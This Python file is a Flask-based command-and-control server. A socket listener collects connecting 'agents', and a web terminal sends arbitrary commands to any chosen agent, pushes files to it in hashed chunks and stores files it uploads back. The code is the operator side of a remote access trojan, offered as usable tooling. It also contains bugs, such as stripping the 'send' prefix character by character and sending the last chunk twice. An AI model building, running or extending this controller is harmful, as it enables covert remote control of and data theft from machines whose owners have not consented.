import socket
import threading
from flask import Flask, render_template, request, jsonify
import time
import os
import ast
import hashlib

# Server configuration
ip_address = '127.0.0.1'
port_number = 1234
UPLOAD_FOLDER = 'uploads'
RECV_SIZE = 1024 * 1024  # 1MB
CHUNK_SIZE = 1024 * 1020  

# Data structures for storing connection information
THREADS = []
CMD_INPUT = {}
CMD_OUTPUT = {}
IPS = {}
THREAD_INFO = {}
CONNECTIONS = {}
EXPECTED_CHUNK_NUMBERS = {}

# Initialize Flask app
app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)


def handle_connection(connection, address):
    thread_name = threading.current_thread().name
    THREAD_INFO[thread_name] = address
    CONNECTIONS[thread_name] = connection
    CMD_OUTPUT[thread_name] = ""  # Initialize command output storage
    EXPECTED_CHUNK_NUMBERS[thread_name] = 1  # Initialize expected chunk number
    print(f"Connected by {address} on thread {thread_name}")

    try:
        while True:
            msg = connection.recv(RECV_SIZE)
            if not msg:
                break

            try:
                msg = msg.decode('utf-8')
                msg = ast.literal_eval(msg)
            except (UnicodeDecodeError, SyntaxError, ValueError) as e:
                print(f"[ERROR][Decode/Eval]: {str(e)}")
                msg = None  # Handle invalid message gracefully

            if isinstance(msg, dict):
                handle_message(msg, thread_name)
            elif msg is not None:
                CMD_OUTPUT[thread_name] += msg
            else:
                print("Message is None, unable to process")

    except Exception as e:
        print(f"Error handling connection with {address}: {e}")
    finally:
        cleanup_connection(thread_name)


def handle_message(msg, thread_name):
    if msg.get("type") == "output":
        CMD_OUTPUT[thread_name] = msg.get("output")
    elif msg.get("type") == "file_chunk":
        handle_file_message(msg, thread_name)
    else:
        print("Unknown message type")
        CMD_OUTPUT[thread_name] = str(msg)


def handle_file_message(msg, thread_name):
    file_name = msg.get("name")
    file_data = msg.get("data").encode('latin1')  # Re-encode data to bytes
    chunk_number = msg.get("chunk_number")
    total_chunks = msg.get("total_chunks")
    chunk_hash = msg.get("chunk_hash")
    output = msg.get("output")

    # Check if the received chunk number is the expected one
    expected_chunk_number = EXPECTED_CHUNK_NUMBERS.get(thread_name, 1)
    if chunk_number != expected_chunk_number:
        print(f"Unexpected chunk number {chunk_number}. Expected {expected_chunk_number}.")
        CMD_OUTPUT[thread_name] = f"Unexpected chunk number {chunk_number}. Expected {expected_chunk_number}."
        return

    # Verify chunk hash
    received_chunk_hash = hashlib.sha256(file_data).hexdigest()
    if received_chunk_hash != chunk_hash:
        print(f"Chunk {chunk_number} hash mismatch. Expected {chunk_hash}, got {received_chunk_hash}")
        CMD_OUTPUT[thread_name] = f"Chunk {chunk_number} hash mismatch. Expected {chunk_hash}, got {received_chunk_hash}"
        return

    file_path = os.path.join(app.config['UPLOAD_FOLDER'], file_name)
    try:
        with open(file_path, 'ab') as file:
            file.write(file_data)
        print(f"Chunk {chunk_number}/{total_chunks} of {file_name} saved successfully.")

        if chunk_number == total_chunks:
            # All chunks received, verify file hash
            with open(file_path, 'rb') as file:
                file_hash = hashlib.sha256(file.read()).hexdigest()
            if file_hash == msg.get("file_hash"):
                print(f"File {file_name} received successfully with correct hash.")
                CMD_OUTPUT[thread_name] = f"File {file_name} received successfully with correct hash."
            else:
                print(f"File {file_name} hash mismatch. Expected {msg.get('file_hash')}, got {file_hash}")
                CMD_OUTPUT[thread_name] = f"File {file_name} hash mismatch. Expected {msg.get('file_hash')}, got {file_hash}"

        # Update the expected chunk number for the next chunk
        EXPECTED_CHUNK_NUMBERS[thread_name] = chunk_number + 1
    except Exception as e:
        print(f"Error saving chunk {chunk_number} of {file_name}: {str(e)}")
        CMD_OUTPUT[thread_name] = f"Error saving chunk {chunk_number} of {file_name}: {str(e)}"


def cleanup_connection(thread_name):
    connection = CONNECTIONS.pop(thread_name, None)
    if connection:
        connection.close()
    CMD_INPUT.pop(thread_name, None)
    CMD_OUTPUT.pop(thread_name, None)
    THREAD_INFO.pop(thread_name, None)
    EXPECTED_CHUNK_NUMBERS.pop(thread_name, None)


def start_socket_server(ip, port):
    global THREADS

    ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ss.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    ss.bind((ip_address, port_number))
    ss.listen(5)
    print(f"Server started at {ip_address}:{port_number}")

    try:
        while True:
            connection, address = ss.accept()
            t = threading.Thread(target=handle_connection, args=(connection, address), name=f"Thread-{len(THREADS)}")
            THREADS.append(t)
            IPS[t.name] = address
            t.start()
    except KeyboardInterrupt:
        print("Server is shutting down.")
    finally:
        ss.close()
        for t in THREADS:
            t.join()


@app.route("/")
def index():
    return render_template('index.html')


@app.route("/agents")
def agents():
    agents_info = [(THREAD_INFO[t], CMD_INPUT.get(t, ''), CMD_OUTPUT.get(t, ''), t) for t in THREAD_INFO]
    return render_template("agents.html", agents=agents_info)


@app.route("/<agentname>/terminal", methods=['GET', 'POST'])
def terminal(agentname):
    return render_template("terminal.html", agentname=agentname)


@app.route("/<agentname>/execute", methods=['POST'])
def execute(agentname):
    cmd = request.json['command']
    connection = CONNECTIONS.get(agentname)
    if connection:
        try:
            if cmd:
                out_dict = {}
                if cmd.startswith('send '):
                    file_path = cmd.strip().strip("send ").strip()
                    try:
                        # Validate file_path and handle securely
                        file_path = os.path.expanduser(file_path)
                        with open(file_path, 'rb') as file:
                            file_data = file.read()
                            file_hash = hashlib.sha256(file_data).hexdigest()
                            total_chunks = (len(file_data) + CHUNK_SIZE - 1) // CHUNK_SIZE
                            for chunk_number in range(total_chunks):
                                chunk = file_data[chunk_number * CHUNK_SIZE: (chunk_number + 1) * CHUNK_SIZE]
                                chunk_hash = hashlib.sha256(chunk).hexdigest()
                                output = f"Sending chunk {chunk_number + 1}/{total_chunks} of {file_path}"
                                out_dict = {
                                    "type": "file",
                                    "name": os.path.basename(file_path),
                                    "data": chunk.decode('latin1'),
                                    "chunk_number": chunk_number + 1,
                                    "total_chunks": total_chunks,
                                    "chunk_hash": chunk_hash,
                                    "file_hash": file_hash,
                                    "output": output
                                }
                                connection.send(str(out_dict).encode('utf-8'))
                                time.sleep(1)  # Ensure chunks are sent separately
                    except Exception as e:
                        output = f"Error reading file: {str(e)}"
                        out_dict = {
                            "type": "file",
                            "name": "",
                            "data": "",
                            "output": output
                        }
                        connection.send(str(out_dict).encode('utf-8'))
                else:
                    out_dict = {
                        "type": "cmd",
                        "cmd": cmd
                    }

                connection.send(str(out_dict).encode('utf-8'))
                time.sleep(2)

                cmdoutput = CMD_OUTPUT.get(agentname, '')
                return jsonify({"output": cmdoutput})
        except Exception as e:
            return jsonify({"error": f"Error sending command to agent {agentname}: {e}"}), 500
    else:
        return jsonify({"error": "Agent not found"}), 404


if __name__ == "__main__":
    server_thread = threading.Thread(target=start_socket_server, args=(ip_address, port_number))
    server_thread.daemon = True
    server_thread.start()
    app.run(host='0.0.0.0', port=5000)
